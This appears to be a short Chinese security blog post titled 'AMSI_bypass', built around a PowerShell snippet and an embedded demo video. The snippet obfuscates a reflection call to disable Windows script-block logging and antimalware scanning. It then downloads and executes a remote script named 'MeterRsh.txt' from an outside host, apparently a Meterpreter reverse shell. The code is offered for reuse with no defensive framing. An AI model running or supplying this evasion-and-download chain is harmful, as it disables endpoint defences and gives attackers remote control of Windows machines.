---
title: AMSI_bypass
date: 2018-09-27 22:43:10
tags: windows
categories: windows
---
![enter description here][1]
<!--more-->
## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/AMSI_bypass.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>


``` stylus
[ScriptBlock]."Get`Fiel`d"('signatures','N'+'onPublic,Static').SetValue($NULL,(New-Object Collections.Generic.HashSet[string]));
		$e=new-object net.webclient;
		$e.proxy=[Net.WebRequest]::GetSystemWebProxy();
		$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
		IEX $e.downloadstring('http://192.168.56.1/MeterRsh.txt');
```

https://pastebin.com/raw/iFVpKim5
https://twitter.com/search?q=https%3A%2F%2Fpastebin.com%2Fraw%2FiFVpKim5&src=typd
https://github.com/kmkz/Pentesting/blob/master/Pentest-cheat-sheet

![enter description here][2]
结合之前一篇做了组合拳，更多思路 自己慢慢去结合。
![enter description here][3]


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/808074FF85349D4227EB08F3A8DAD3CB.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/A455589180EC1B9D7C61286B67D7AEBE.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1538097380864.jpg 